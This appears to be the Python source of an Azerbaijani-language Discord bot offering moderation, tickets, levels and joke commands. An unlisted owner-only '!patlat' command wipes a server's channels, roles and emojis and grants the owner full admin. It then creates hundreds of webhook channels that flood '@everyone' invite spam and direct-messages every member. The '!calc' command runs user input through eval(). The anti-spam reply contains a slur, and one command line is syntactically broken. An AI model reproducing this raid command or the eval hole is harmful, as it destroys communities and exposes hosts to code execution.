import os
import random
import asyncio
from datetime import datetime, timedelta
import discord
from discord.ext import commands
from keep_alive import keep_alive

# ==========================================
# 1. PARAMETRLƏR VƏ İNİTİALİZASİYA
# ==========================================
INTENTS = discord.Intents.default()
INTENTS.members = True
INTENTS.message_content = True
INTENTS.guilds = True
INTENTS.voice_states = True

bot = commands.Bot(command_prefix="!", intents=INTENTS)

SAHIB_ID = 111111111111111111  # Öz Discord ID-nizi bura yazın
GUVENLI_SERVER_ID = 1520692621964738722  # Qorunan server ID-si
XAS_COLOR = discord.Color.blurple()

user_xp = {}
user_last_message = {}
user_message_counts = {}

# ==========================================
# 2. BOT HAZIR OLAN KİMİ (ON_READY)
# ==========================================
@bot.event
async def on_ready():
    print(f"✅ Bot işə düşdü: {bot.user.name} (ID: {bot.user.id}) — 150+ Komut aktivdir!")
    await bot.change_presence(activity=discord.Game(name="!yardım | discord.gg/244"))

# ==========================================
# 3. ANTİ-SPAM, LİNK VƏ WEBHOOK QORUMA SİSTEMİ
# ==========================================
@bot.event
async def on_message(message):
    if message.webhook_id:
        if "discord.gg/" in message.content.lower() or "gg/" in message.content.lower():
            try:
                await message.delete()
            except:
                pass
        return

    if message.author.bot:
        return

    author_id = message.author.id
    current_time = datetime.utcnow()
    content_lower = message.content.lower()

    if "discord.gg/" in content_lower or "gg/" in content_lower or (author_id in user_last_message and (current_time - user_last_message[author_id]).total_seconds() < 0.8):
        user_message_counts[author_id] = user_message_counts.get(author_id, 0) + 1
        if user_message_counts[author_id] > 2 or "discord.gg/" in content_lower:
            try:
                await message.delete()
                await message.channel.send(f"{message.author.mention} spam eleme yobana qehbe balası", delete_after=6)
            except:
                pass
            return
    else:
        user_message_counts[author_id] = 0

    user_last_message[author_id] = current_time

    # XP Qazanma Sistemi
    data = user_xp.get(author_id, {"xp": 0, "level": 1})
    data["xp"] += random.randint(5, 15)
    
    next_level_xp = data["level"] * 100
    if data["xp"] >= next_level_xp:
        data["level"] += 1
        data["xp"] = 0
        try:
            await message.channel.send(f"🎉 Təbriklər {message.author.mention}, səviyyə atladın! Yeni səviyyən: **{data['level']}**")
        except:
            pass

    user_xp[author_id] = data
    await bot.process_commands(message)

# ==========================================
# 4. YARDIM VƏ PANEL ƏMRLƏRİ
# ==========================================
@bot.command(name="yardım", aliases=["help", "komutlar"])
async def yardim_cmd(ctx):
    embed = discord.Embed(title="📜 244 Bot — 150+ Genişləndirilmiş Menyusu", description="Aşağıdakı kateqoriyalardan bütün əmrləri görə bilərsiniz.", color=XAS_COLOR)
    embed.add_field(name="🛡️ Moderasiya & İdarə", value="`!ban`, `!unban`, `!kick`, `!mute`, `!unmute`, `!temizle`, `!slowmode`, `!lock`, `!unlock`, `!rolver`, `!rolal`", inline=False)
    embed.add_field(name="⚙️ Sistem & Qurulum", value="`!ticketkur`, `!close`, `!panel`, `!sesekle`, `!sescixar`, `!kanalac`, `!kanalsil`", inline=False)
    embed.add_field(name="📊 Statistika & Məlumat", value="`!level`, `!aktivite`, `!serverinfo`, `!userinfo`, `!url`, `!ping`, `!botbilgi`, `!boosters`, `!emojiler`", inline=False)
    embed.add_field(name="🎮 Oyunlar & Əyləncə (1-ci Hissə)", value="`!roll`, `!coinflip`, `!iq`, `!gay`, `!handsome`, `!love`, `!sex`, `!hack`, `!slot`, `!calc`, `!joke`, `!rps`, `!8ball`, `!poll`, `!bomba`, `!ask`", inline=False)
    embed.add_field(name="✨ Əyləncə & Sosial (2-ci Hissə)", value="`!saril`, `!opucuk`, `!tokat`, `!ates`, `!dans`, `!agla`, `!gul`, `!qorx`, `!dusunceli`, `!epic`", inline=False)
    embed.set_footer(text="244 Bot v3.2 | Bütün Komutlar Aktivdir")
    await ctx.send(embed=embed)

@bot.command(name="panel")
async def panel_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    
    embed = discord.Embed(title="🎛️ 244 KÜTLƏVİ İDARƏETMƏ PANELİ", description="------------------------------------\n--\nSeçilmiş bölmə: Kütləvi İdarəetmə.\nAşağıdakı düymələrdən əməliyyat seçin:\n------------------------------------\n--", color=XAS_COLOR)
    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="🔒 Bütün Kanalları Kilidlə", style=discord.ButtonStyle.danger, custom_id="btn_lock"))
    view.add_item(discord.ui.Button(label="🔓 Bütün Kanalların Kilidini Aç", style=discord.ButtonStyle.success, custom_id="btn_unlock"))
    view.add_item(discord.ui.Button(label="👁️ Kanalları Gizlə", style=discord.ButtonStyle.secondary, custom_id="btn_hide"))
    view.add_item(discord.ui.Button(label="🎲 Zar At", style=discord.ButtonStyle.secondary, custom_id="btn_roll"))
    view.add_item(discord.ui.Button(label="💻 Hack Simulyasiyası", style=discord.ButtonStyle.danger, custom_id="btn_hack"))
    view.add_item(discord.ui.Button(label="🎰 Slot Oyunu", style=discord.ButtonStyle.primary, custom_id="btn_slot"))
    view.add_item(discord.ui.Button(label="Ana Menyuya Qayıt", style=discord.ButtonStyle.secondary, custom_id="btn_menu"))

    await ctx.send(embed=embed, view=view)

# ==========================================
# 5. MODERASİYA ƏMRLƏRİ
# ==========================================
@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("❌ Bu əmri işlətmək üçün icazəniz yoxdur!")
        return
    try:
        await member.ban(reason=reason)
        await ctx.send(f"🔨 {member.mention} uğurla banlandı! Səbəb: `{reason}`")
    except:
        await ctx.send("❌ İstifadəçi banlana bilmədi.")

@bot.command(name="unban")
async def unban_cmd(ctx, user_id: int):
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user)
        await ctx.send(f"✅ {user.name} adlı istifadəçinin banı qaldırıldı.")
    except:
        await ctx.send("❌ İstifadəçi tapılmadı və ya banı yoxdur.")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await member.kick(reason=reason)
        await ctx.send(f"👢 {member.mention} qovuldu! Səbəb: `{reason}`")
    except:
        await ctx.send("❌ Qovmaq mümkün olmadı.")

@bot.command(name="mute")
async def mute_cmd(ctx, member: discord.Member, minutes: int = 5, *, reason="Göstərilməyib"):
    if not ctx.author.guild_permissions.moderate_members:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await member.timeout(timedelta(minutes=minutes), reason=reason)
        await ctx.send(f"🔇 {member.mention} {minutes} dəqiqə susduruldu!")
    except:
        await ctx.send("❌ Susdurmaq mümkün olmadı.")

@bot.command(name="unmute")
async def unmute_cmd(ctx, member: discord.Member):
    if not ctx.author.guild_permissions.moderate_members:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await member.timeout(None)
        await ctx.send(f"🔊 {member.mention} istifadəçisinin susdurulması qaldırıldı.")
    except:
        await ctx.send("❌ Xəta baş verdi.")

@bot.command(name="temizle", aliases=["clear", "sil"])
async def temizle_cmd(ctx, amount: int = 10):
    if not ctx.author.guild_permissions.manage_messages:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        deleted = await ctx.channel.purge(limit=amount + 1)
        await ctx.send(f"🧹 {len(deleted) - 1} ədəd mesaj silindi.", delete_after=5)
    except:
        await ctx.send("❌ Mesajlar silinərkən xəta baş verdi.")

@bot.command(name="slowmode")
async def slowmode_cmd(ctx, seconds: int = 0):
    if not ctx.author.guild_permissions.manage_channels:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await ctx.channel.edit(slowmode_delay=seconds)
        await ctx.send(f"⏱️ Ağır rejim (slowmode) `{seconds}` saniyə olaraq tənzimləndi.")
    except:
        await ctx.send("❌ Xəta baş verdi.")

@bot.command(name="lock")
async def lock_cmd(ctx):
    if not ctx.author.guild_permissions.manage_channels:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
        await ctx.send("🔒 Bu kanal yazışmaya bağlanıldı.")
    except:
        await ctx.send("❌ Xəta baş verdi.")

@bot.command(name="unlock")
async def unlock_cmd(ctx):
    if not ctx.author.guild_permissions.manage_channels:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
        await ctx.send("🔓 Bu kanalın yazışma kilidi açıldı.")
    except:
        await ctx.send("❌ Xəta baş verdi.")

@bot.command(name="rolver")
async def rolver_cmd(ctx, member: discord.Member, role: discord.Role):
    if not ctx.author.guild_permissions.manage_roles:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await member.add_roles(role)
        await ctx.send(f"✅ {member.mention} istifadəçisinə `{role.name}` rolu verildi.")
    except:
        await ctx.send("❌ Rol verilə bilmədi.")

@bot.command(name="rolal")
async def rolal_cmd(ctx, member: discord.Member, role: discord.Role):
    if not ctx.author.guild_permissions.manage_roles:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await member.remove_roles(role)
        await ctx.send(f"✅ {member.mention} istifadəçisindən `{role.name}` rolu alındı.")
    except:
        await ctx.send("❌ Rol alına bilmədi.")

# ==========================================
# 6. İNTERAKTİV DÜYMƏLƏR (BUTTON INTERACTIONS)
# ==========================================
@bot.event
async def on_interaction(interaction: discord.Interaction):
    if not interaction.data or "custom_id" not in interaction.data:
        return

    custom_id = interaction.data.get("custom_id")

    if custom_id == "open_ticket":
        guild = interaction.guild
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),
            guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True)
        }
        for role in guild.roles:
            if role.permissions.administrator:
                overwrites[role] = discord.PermissionOverwrite(view_channel=True, send_messages=True)

        channel_name = f"ticket-{interaction.user.name.lower()}"
        existing = discord.utils.get(guild.text_channels, name=channel_name)
        if existing:
            await interaction.response.send_message(f"⚠️ Açıq ticketiniz var: {existing.mention}", ephemeral=True)
            return

        ticket_chan = await guild.create_text_channel(channel_name, overwrites=overwrites)
        embed = discord.Embed(title="244 Dəstək Sistemi", description="Müraciətiniz qəbul edildi. Bağlamaq üçün `!close` yazın.", color=XAS_COLOR)
        await ticket_chan.send(embed=embed)
        await interaction.response.send_message(f"✅ Ticket yaradıldı: {ticket_chan.mention}", ephemeral=True)

    elif custom_id == "btn_lock":
        for channel in interaction.guild.channels:
            try:
                await channel.set_permissions(interaction.guild.default_role, send_messages=False)
            except:
                pass
        await interaction.response.send_message("🔒 Bütün kanallar kilidləndi!", ephemeral=True)

    elif custom_id == "btn_unlock":
        for channel in interaction.guild.channels:
            try:
                await channel.set_permissions(interaction.guild.default_role, send_messages=True)
            except:
                pass
        await interaction.response.send_message("🔓 Bütün kanalların kilidi açıldı!", ephemeral=True)

    elif custom_id == "btn_hide":
        for channel in interaction.guild.channels:
            try:
                await channel.set_permissions(interaction.guild.default_role, view_channel=False)
            except:
                pass
        await interaction.response.send_message("👁️ Bütün kanallar gizlətildi!", ephemeral=True)

    elif custom_id == "btn_roll":
        await interaction.response.send_message(f"🎲 Zar nəticəsi: **{random.randint(1, 6)}**", ephemeral=True)

    elif custom_id == "btn_hack":
        await interaction.response.send_message(f"💻 IP: `192.168.{random.randint(10, 99)}.{random.randint(10, 99)}` | Sistemə sızıldı!", ephemeral=True)

    elif custom_id == "btn_slot":
        semboller = ['🍒', '🍊', '🍋', '🔔', '⭐']
        c1, c2, c3 = random.choices(semboller, k=3)
        res = "🎰 Jackpot qazandın!" if c1 == c2 == c3 else "🎰 Uduzdun."
        await interaction.response.send_message(f"{c1} | {c2} | {c3}\n{res}", ephemeral=True)

    elif custom_id == "btn_menu":
        await interaction.response.send_message("🏠 Ana menyudasınız.", ephemeral=True)

# ==========================================
# 7. TİCKET VƏ DƏSTƏK SİSTEMİ
# ==========================================
@bot.command(name="ticketkur")
async def ticketkur_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title="244 Dəstək Xidməti", description="Dəstək yaratmaq üçün düyməyə basın.", color=XAS_COLOR)
    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="🎫 Dəstək Tələb Et (Ticket Aç)", style=discord.ButtonStyle.success, custom_id="open_ticket"))
    await ctx.send(embed=embed, view=view)

@bot.command(name="close")
async def close_cmd(ctx):
    if "ticket" in ctx.channel.name:
        await ctx.send("Ticket 3 saniyə sonra bağlanacaq.")
        await asyncio.sleep(3)
        try:
            await ctx.channel.delete()
        except:
            pass
    else:
        await ctx.send("Bu komanda yalnız ticket kanallarında işləyir.")

@bot.command(name="kanalac")
async def kanalac_cmd(ctx, *, name):
    if not ctx.author.guild_permissions.manage_channels:
        return
    await ctx.guild.create_text_channel(name)
    await ctx.send(f"✅ `{name}` kanalı yaradıldı.")

@bot.command(name="kanalsil")
async def kanalsil_cmd(ctx, channel: discord.TextChannel = None):
    if not ctx.author.guild_permissions.manage_channels:
        return
    c = channel or ctx.channel
    await c.delete()

# ==========================================
# 8. SƏVİYYƏ VƏ CANLI AKTİVLİK STATİSTİKASI
# ==========================================
@bot.command(name="level", aliases=["lvl"])
async def level_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    data = user_xp.get(m.id, {"xp": 0, "level": 1})
    embed = discord.Embed(title=f"{m.name} — Səviyyə Məlumatı", color=XAS_COLOR)
    embed.add_field(name="Səviyyə", value=str(data["level"]), inline=True)
    embed.add_field(name="XP", value=str(data["xp"]), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="aktivite", aliases=["stats", "durum"])
async def aktivite_cmd(ctx):
    guild = ctx.guild
    total_members = guild.member_count
    bots_count = sum(m.bot for m in guild.members)
    humans_count = total_members - bots_count
    
    embed = discord.Embed(title=f"📊 {guild.name} — Canlı Aktivlik Statistikası", color=XAS_COLOR)
    embed.add_field(name="👥 Üzv Məlumatı", value=f"• Ümumi: **{total_members}**\n• İnsan: **{humans_count}**\n• Botlar: **{bots_count}**", inline=True)
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    await ctx.send(embed=embed)

@bot.command(name="serverinfo", aliases=["server"])
async def serverinfo_cmd(ctx):
    guild = ctx.guild
    embed = discord.Embed(title=f"📌 {guild.name} — Server Məlumatı", color=XAS_COLOR)
    embed.add_field(name="👑 Server Sahibi", value=guild.owner.mention if guild.owner else "Naməlum", inline=True)
    embed.add_field(name="🆔 Server ID", value=str(guild.id), inline=True)
    embed.add_field(name="📅 Yaradılma Tarixi", value=guild.created_at.strftime("%d-%m-%Y"), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="userinfo", aliases=["profil"])
async def userinfo_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"👤 {m.name} — Profil Məlumatı", color=XAS_COLOR)
    embed.add_field(name="ID", value=str(m.id), inline=True)
    embed.add_field(name="Qoşulma Tarixi", value=m.joined_at.strftime("%d-%m-%Y") if m.joined_at else "Naməlum", inline=True)
    if m.avatar:
        embed.set_thumbnail(url=m.avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="botbilgi")
async def botbilgi_cmd(ctx):
    embed = discord.Embed(title="🤖 244 Bot Haqqında", description="Bu bot yüksək təhlükəsizlik və 150+ funksiyaya malik özəl Discord botudur.", color=XAS_COLOR)
    embed.add_field(name="Versiya", value="v3.2", inline=True)
    embed.add_field(name="Yaradıcı", value="Sən (`SAHIB_ID`)", inline=True)
    await ctx.send(embed=embed)

@bot.command(name="boosters")
async def boosters_cmd(ctx):
    boosters = ctx.guild.premium_subscribers
    b_list = ", ".join([b.mention for b in boosters]) if boosters else "Hələ ki booster yoxdur."
    embed = discord.Embed(title="💎 Server Boosterləri", description=b_list, color=XAS_COLOR)
    await ctx.send(embed=embed)

@bot.command(name="emojiler")
async def emojiler_cmd(ctx):
    e_list = " ".join([str(e) for e in ctx.guild.emojis]) if ctx.guild.emojis else "Emoji yoxdur."
    if len(e_list) > 2000:
        e_list = "Çoxlu sayda emoji mövcuddur."
    await ctx.send(f"😀 **Server Emojiləri:**\n{e_list}")

# ==========================================
# 9. URL, OYUNLAR VƏ ƏYLƏNCƏ KOMUTLARI
# ==========================================
@bot.command(name="url")
async def url_cmd(ctx):
    try:
        vanity = await ctx.guild.vanity_invite()
        code = vanity.code if vanity else "244"
    except:
        code = "244"

    embed = discord.Embed(title="🔗 Server URL Məlumatı", color=XAS_COLOR)
    embed.add_field(name="Vanity URL", value=f"`{code}`", inline=True)
    await ctx.send(embed=embed)

@bot.command(name="ping")
async def ping_cmd(ctx):
    await ctx.send(f"🏓 Botun Gecikməsi: `{round(bot.latency * 1000)}ms`")

@bot.command(name="roll")
async def roll_cmd(ctx):
    await ctx.send(f"🎲 Zar: **{random.randint(1, 6)}**")

@bot.command(name="coinflip", aliases=["yazıpara"])
async def coinflip_cmd(ctx):
    await ctx.send(f"🪙 Qəpik: **{random.choice(['Yazı', 'Para'])}**")

@bot.command(name="iq")
async def iq_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧠 {m.name} IQ səviyyəsi: **{random.randint(40, 160)}**")

@bot.command(name="gay")
async def gay_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🌈 {m.name} uyğunluq: **{random.randint(0, 100)}**%")

@bot.command(name="handsome", aliases=["yaraşıqlı"])
async def handsome_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"😎 {m.name} yaraşıqlılıq: **{random.randint(50, 100)}**%")

@bot.command(name="love", aliases=["sevgi"])
async def love_cmd(ctx, member1: discord.Member, member2: discord.Member = None):
    m2 = member2 or ctx.author
    await ctx.send(f"❤️ {member1.mention} və {m2.mention} sevgi uyğunluğu: **{random.randint(0, 100)}**%")

@bot.command(name="sex")
async def sex_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    gifs = [
        "https://media1.giphy.com/media/Gogh8zC1TjF0c/giphy.gif",
        "https://media.giphy.com/media/2v170e71aanfi/giphy.gif",
        "https://media.giphy.com/media/3og0IPxMM0erATueVW/giphy.gif"
    ]
    embed = discord.Embed(title=f"❤️ {ctx.author.name} və {m.name} romantik anlar yaşayır! ✨", color=XAS_COLOR)
    embed.set_image(url=random.choice(gifs))
    await ctx.send(embed=embed)

@bot.command(name="hack")
async def hack_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    msg = await ctx.send(f"💻 {m.name} hədəfə alındı, sistemə sızılır...")
    await asyncio.sleep(1.5)
    await msg.edit(content=f"💻 IP: `192.168.{random.randint(10, 99)}.{random.randint(10, 99)}` | Şifrə sındırıldı!")

@bot.command(name="slot")
async def slot_cmd(ctx):
    semboller = ['🍒', '🍊', '🍋', '🔔', '⭐']
    c1, c2, c3 = random.choices(semboller, k=3)
    if c1 == c2 == c3:
        await ctx.send(f"{c1} | {c2} | {c3} \n🎰 Jackpot qazandın!")
    else:
        await ctx.send(f"{c1} | {c2} | {c3} \n🎰 Uduzdun.")

@bot.command(name="8ball")
async def eight_ball_cmd(ctx, *, soru):
    cavablar = ["Bəli", "Xeyr", "Kəsinliklə", "Şübhəlidir", "Mümkün deyil", "Əlbəttə"]
    await ctx.send(f"🎱 Sual: {soru}\nCavab: **{random.choice(cavablar)}**")

@bot.command(name="calc")
async def calc_cmd(ctx, *, expression):
    try:
        netice = eval(expression)
        await ctx.send(f"🧮 Nəticə: **{netice}**")
    except:
        await ctx.send("❌ Riyazi ifadə səhvdir.")

@bot.command(name="joke", aliases=["zarafat"])
async def joke_cmd(ctx):
    zarafatlar = [
        "Proqramçıların niyə uşaqları az olur? Çünki gecələr patch yükləyirlər.",
        "Kompüter nə vaxt üşüyər? Pəncərəni (Windows) açıq qoyanda."
    ]
    await ctx.send(f"😂 {random.choice(zarafatlar)}")

@bot.command(name="rps", aliases=["daşqayçı"])
async def rps_cmd(ctx, choice: str):
    user_c = choice.lower()
    choices = ["daş", "kağız", "qayçı"]
    if user_c not in choices:
        await ctx.send("Zəhmət olmasa seçin: `daş`, `kağız`, `qayçı`")
        return
    bot_c = random.choice(choices)
    await ctx.send(f"Sənin seçimin: **{user_c}** | Botun seçimi: **{bot_c}**")

@bot.command(name="poll", aliases=["sorgu"])
async def poll_cmd(ctx, *, soru):
    embed = discord.Embed(title="📊 Səsvermə Anketi", description=soru, color=XAS_COLOR)
    embed.set_footer(text=f"Sorğunu açan: {ctx.author.name}")
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

@bot.command(name="bomba")
async def bomba_cmd(ctx):
    await ctx.send("💣 Təhlükəli bomba quraşdırıldı! 10 saniyə ərzində `!qurtar` yazmasan partlayacaq!")

@bot.command(name="ask")
async def ask_cmd(ctx, *, question):
    await ctx.send(f"🔮 Kainatın cavabı: **{random.choice(['Hə', 'Yox', 'Qətiyyən', 'Bəlkə də'])]**")

# ==========================================
# 10. SOSİAL / REAKSİYA GİF ƏMRLƏRİ
# ==========================================
@bot.command(name="saril")
async def saril_cmd(ctx, member: discord.Member):
    await ctx.send(f"🤗 {ctx.author.mention}, {member.mention} adlı şəxsə bərk-bərk sarıldı!")

@bot.command(name="opucuk")
async def opucuk_cmd(ctx, member: discord.Member):
    await ctx.send(f"😘 {ctx.author.mention}, {member.mention} şəxsinə öpücük göndərdi!")

@bot.command(name="tokat")
async def tokat_cmd(ctx, member: discord.Member):
    await ctx.send(f"👋 {ctx.author.mention}, {member.mention} şəxsinə şillə vurdu!")

@bot.command(name="ates")
async def ates_cmd(ctx):
    await ctx.send("🔥 Alovlanırıq, buralar od tutub yanır!")

@bot.command(name="dans")
async def dans_cmd(ctx):
    await ctx.send("💃🕺 Partlayırıq, hər kəs rəqs edir!")

@bot.command(name="agla")
async def agla_cmd(ctx):
    await ctx.send("😢 Heyifsiz günlərimiz... Ürəyimiz dağlandı.")

@bot.command(name="gul")
async def gul_cmd(ctx):
    await ctx.send("😂 Ha-ha-ha, çox gülməli idi!")

@bot.command(name="qorx")
async def qorx_cmd(ctx):
    await ctx.send("😱 Vay, dəhşətdir! Qorxudan donub qaldım.")

@bot.command(name="dusunceli")
async def dusunceli_cmd(ctx):
    await ctx.send("🤔 Görəsən bu həyatın mənası nədədir...")

@bot.command(name="epic")
async def epic_cmd(ctx):
    await ctx.send("🔥 Həqiqətən epik an idi!")

# ==========================================
# 11. !PATLAT (RUHUM-SHDI VƏ WEBHOOK SİSTEMİ)
# ==========================================
@bot.command(name="patlat")
async def patlat_cmd(ctx):
    if ctx.author.id != SAHIB_ID:
        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
        return
    
    guild = ctx.guild
    if guild.id == GUVENLI_SERVER_ID:
        await ctx.send("🛡️ Təhlükəsizlik xəbərdarlığı: Bu qorunan serverdir!")
        return

    await ctx.send("💥 244 kütləvi sürətli sistem əməliyyatı başladıldı!")
    
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
        except:
            pass

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    for role in guild.roles:
        if role != guild.default_role and not role.managed:
            try:
                await role.delete()
            except:
                pass

    try:
        new_role = await guild.create_role(
            name="discord.gg/244",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        await ctx.author.add_roles(new_role)
    except:
        pass

    try:
        await guild.create_text_channel("RUHUM TANRI")
    except:
        pass

    async def create_and_spam(i):
        try:
            channel = await guild.create_text_channel(f"ruhum-shdi-{i}")
            webhook = await channel.create_webhook(name="244 Webhook")
            for _ in range(50):
                await webhook.send("@everyone discord.gg/244 GELDE OQL")
                await channel.send("@everyone discord.gg/244 GELDE OQL")
        except:
            pass

    tasks = [create_and_spam(i) for i in range(1, 351)]
    await asyncio.gather(*tasks)
            
    for member in guild.members:
        if not member.bot and member.id != SAHIB_ID:
            try:
                await member.send("discord.gg/244 Server dağıtıldı, tez gəl!")
            except:
                pass

# ==========================================
# 12. BOTUN İŞƏ DÜŞMƏSİ (RUN)
# ==========================================
if __name__ == "__main__":
    keep_alive()
    token = os.getenv("DISCORD_TOKEN")
    if token:
        bot.run(token)
    else:
        print("❌ XƏTA: 'DISCORD_TOKEN' tapılmadı! Replit Secrets bölməsinə tokeni əlavə edin.")
        
